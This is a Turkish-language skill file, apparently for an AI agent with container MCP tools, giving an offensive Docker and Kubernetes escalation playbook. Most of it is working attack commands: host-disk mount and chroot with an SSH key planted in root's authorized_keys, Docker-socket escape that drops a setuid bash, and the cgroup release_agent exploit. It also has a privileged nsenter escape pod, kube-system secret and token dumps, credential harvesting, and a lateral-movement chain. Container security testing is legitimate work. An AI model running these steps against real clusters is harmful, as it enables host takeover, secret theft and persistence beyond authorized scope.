---
name: container-security
description: "Docker ve Kubernetes güvenlik testi metodolojisi. Container escape, K8s RBAC escalation, secret dump, privileged pod creation, Helm chart analizi ve container supply chain saldırıları."
---

# Container & Kubernetes Güvenlik Testi Metodolojisi

Docker container veya Kubernetes pod içindesin ya da dışarıdan K8s cluster'ına erişimin var.
Hedef: container/pod'dan node'a, node'dan cluster admin'e yükselmek.

---

## 1. Ortam Tespiti

```bash
# Container içinde miyim?
cat /proc/1/cgroup | grep docker        # docker container
cat /proc/1/cgroup | grep kubepods      # kubernetes pod
ls /.dockerenv 2>/dev/null && echo "Docker container"
env | grep -E "KUBERNETES|K8S"          # K8s ortam değişkenleri

# Container metadata
cat /proc/self/status | grep -E "Cap|Uid|Gid"
capsh --print 2>/dev/null || cat /proc/self/status | grep Cap

# K8s service account token var mı?
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

---

## 2. Docker Escape Teknikleri

### 2.1 Privileged Container Escape

```bash
# Container privileged mı?
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff → full capabilities = privileged

# Privileged ise: host cihazları mount et
fdisk -l                                     # Host disk bölümlerini gör
mkdir /mnt/host && mount /dev/sda1 /mnt/host # Host root'u mount et
chroot /mnt/host /bin/bash                   # Host sisteme chroot
# Artık host sistemdesin!

# SSH key ekle
echo "ssh-rsa AAAA..." >> /mnt/host/root/.ssh/authorized_keys
```

### 2.2 Docker Socket Escape (/var/run/docker.sock)

```bash
# Socket mount edilmiş mi?
ls -la /var/run/docker.sock && echo "VULNERABLE: Docker socket exposed"

# Socket varsa: yeni privileged container başlat
docker -H unix:///var/run/docker.sock run -it --rm \
  --privileged --pid=host --net=host \
  -v /:/mnt/host \
  ubuntu:latest chroot /mnt/host

# veya curl ile Docker API kullan
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/sh","-c","cp /bin/bash /mnt/host/tmp/bash && chmod u+s /mnt/host/tmp/bash"],"Binds":["/:/mnt/host"],"Privileged":true}' \
  http://localhost/containers/create?name=escape
curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape/start
```

### 2.3 cgroup v1 Release Agent Escape

```bash
# Privileged container veya SYS_ADMIN capability yeterli
# Mount check
cat /proc/self/cgroup

# Exploit
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd   # host'ta çalışacak komut
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output                              # host üzerinde çalıştı mı?
```

### 2.4 Capabilities Abuse

```bash
# Tehlikeli capability'leri kontrol et
capsh --print | grep -E "cap_sys_admin|cap_net_admin|cap_dac_read_search|cap_sys_ptrace"

# CAP_SYS_ADMIN → mount, ptrace, namespace
# CAP_NET_ADMIN → iptables, ARP poison
# CAP_DAC_READ_SEARCH → host dosya okuma (shocker exploit)
# CAP_SYS_PTRACE → host process memory okuma

# shocker exploit (CAP_DAC_READ_SEARCH)
# https://github.com/gabrtv/shocker
python3 shocker.py
```

---

## 3. Kubernetes RBAC Escalation

### 3.1 Mevcut İzinleri Listele

```bash
# Service account token'ı kullan
APISERVER="https://$(env | grep KUBERNETES_SERVICE_HOST | cut -d= -f2)"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Kendi izinlerini listele
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/default/pods"

# auth can-i — tüm izinleri listele
mcp__container-tools__k8s_rbac_audit(token="...", api_server="...")

# kubectl ile (varsa)
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
```

### 3.2 Secret Dump

```bash
# Tüm namespace'lerdeki secret'ları listele
mcp__container-tools__k8s_secret_dump(token="...", api_server="...", namespace="all")

# Manuel curl
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/kube-system/secrets" | python3 -m json.tool

# ServiceAccount token'larını decode et
# Base64 decode: echo "TOKEN_BASE64" | base64 -d
```

### 3.3 Privileged Pod ile Node Escape

```bash
# create pods yetkisi varsa: privileged pod yarat
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: escape
    image: ubuntu
    securityContext:
      privileged: true
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n /bin/bash"]
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
EOF

# veya mcp tool ile
mcp__container-tools__k8s_pod_escape(api_server="...", token="...")
```

### 3.4 Service Account Token ile Cluster Admin

```bash
# kube-system namespace'indeki token'ları çek (yüksek yetkili)
mcp__container-tools__k8s_sa_token_abuse(
    api_server="...",
    token="current_token",
    target_namespace="kube-system"
)

# cluster-admin binding var mı?
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" | \
  python3 -c "import sys,json; [print(b['metadata']['name'], b.get('subjects','')) for b in json.load(sys.stdin)['items']]"
```

---

## 4. Secret ve Credential Enumeration

```bash
# Container env vars (API key, DB password, token)
env | grep -iE "key|token|secret|password|passwd|auth|credential"

# Mounted secrets
find /run/secrets/ /var/run/secrets/ /etc/secrets/ -type f 2>/dev/null | xargs cat

# K8s ConfigMap'ler (bazıları secret içerir)
kubectl get configmaps --all-namespaces -o yaml | grep -iE "key|token|password"

# Uygulama config dosyaları
find / -name "*.env" -o -name "config.yaml" -o -name "*.conf" 2>/dev/null | \
  grep -v proc | head -20 | xargs grep -iE "password|secret|token" 2>/dev/null
```

---

## 5. Container Image Analizi

```bash
# Image'deki katmanları tara (Trivy)
mcp__container-tools__container_image_scan(image="nginx:latest")
# trivy image nginx:latest

# Dockerfile analizi
mcp__container-tools__helm_chart_scan(chart_path="/path/to/chart")

# Image geçmişi — gizlenmiş komutlar
docker history IMAGE_ID --no-trunc

# Layers'dan silinmiş dosyaları kurtar
dive IMAGE_ID   # veya
docker save IMAGE_ID | tar -xC /tmp/layers/
find /tmp/layers -name "layer.tar" | xargs -I{} tar -tvf {} 2>/dev/null | grep -iE "password|secret|key"
```

---

## 6. Network Policy Audit

```bash
# Hangi pod-to-pod iletişim izinli?
mcp__container-tools__k8s_network_policy_audit(api_server="...", token="...")

# Network policy yoksa → tüm pod'lar birbirine konuşabilir
kubectl get networkpolicies --all-namespaces

# Service enumeration
kubectl get services --all-namespaces
# ClusterIP service'lere pod içinden erişilebilir:
curl http://SERVICE_NAME.NAMESPACE.svc.cluster.local:PORT
```

---

## 7. Helm Chart Güvenlik Analizi

```bash
# Helm chart'ı tara
mcp__container-tools__helm_chart_scan(chart_path="./my-chart")

# Manuel kontroller
grep -r "privileged: true" ./chart/
grep -r "hostPID\|hostNetwork\|hostIPC" ./chart/
grep -r "runAsRoot\|runAsUser: 0" ./chart/
grep -r "allowPrivilegeEscalation" ./chart/

# values.yaml'da hardcoded secret
grep -iE "password:|secret:|token:|key:" ./chart/values.yaml
```

---

## 8. Docker Registry Enumeration

```bash
# Unauthenticated registry erişimi
mcp__container-tools__registry_enum(registry_url="http://TARGET:5000")

# Manuel
curl http://TARGET:5000/v2/_catalog          # Image listesi
curl http://TARGET:5000/v2/IMAGE/tags/list    # Tag listesi
curl http://TARGET:5000/v2/IMAGE/manifests/latest  # Manifest

# Layers indirip analiz et
docker pull TARGET:5000/IMAGE:TAG
docker save TARGET:5000/IMAGE:TAG | tar -xC /tmp/
```

---

## 9. MCP Tool Referansı

```
mcp__container-tools__docker_escape_check(container_id)
  → Privileged, socket mount, capabilities kontrol

mcp__container-tools__docker_enum_secrets(container_id)
  → Env vars, /run/secrets, mounted configs

mcp__container-tools__k8s_rbac_audit(api_server, token, namespace)
  → kubectl auth can-i --list tüm izinler

mcp__container-tools__k8s_secret_dump(api_server, token, namespace)
  → Tüm K8s secret'ları topla ve decode et

mcp__container-tools__k8s_sa_token_abuse(api_server, token, target_namespace)
  → Service account token → privilege escalation

mcp__container-tools__k8s_pod_escape(api_server, token, node_name)
  → Privileged pod ile node escape

mcp__container-tools__k8s_network_policy_audit(api_server, token)
  → Pod-to-pod iletişim haritası

mcp__container-tools__helm_chart_scan(chart_path)
  → Hardcoded secret, privileged config tespiti

mcp__container-tools__container_image_scan(image)
  → Trivy CVE taraması

mcp__container-tools__registry_enum(registry_url, username, password)
  → Unauthenticated registry enumeration
```

---

## 10. Saldırı Zinciri Özeti

```
1. Container içine foothold al (RCE, LFI, vs.)
   ↓
2. Ortam tespiti: privileged? socket? capabilities? K8s?
   ↓
3a. Privileged/socket → Host disk mount → chroot → SSH key ekle
3b. K8s SA token → RBAC audit → secret dump / pod escape
   ↓
4. Node escape → Host üzerinde komut çalıştır
   ↓
5. Diğer node'lara lateral movement (kubeconfig, token harvest)
   ↓
6. Cluster Admin token bul → tüm cluster kontrolü
```
